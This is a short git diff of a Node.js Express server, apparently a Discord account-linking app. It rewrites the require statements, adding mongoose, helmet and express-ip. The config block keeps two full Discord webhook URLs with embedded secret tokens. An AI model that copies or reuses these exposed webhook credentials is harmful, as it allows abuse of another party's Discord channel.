@@ -8,11 +8,14 @@ const redirect_uri = 'https://linkdiscord.herokuapp.com'
 const webhook_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
 const webhook_logging_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
 // Config end
-const axios = require('axios')
-const express = require('express')
-const path = require('path')
-const app = express()
-const port = process.env.PORT || 3000
+const { post, get } = require("axios"),
+    express = require("express"),
+    mongoose = require("mongoose"),
+    helmet = require("helmet"),
+    app = express(),
+    expressip = require("express-ip"),
+port = process.env.PORT || 3000,
+axios = require("axios")
 
 console.log('got them both')
 app.get('/', async (req, res) => {
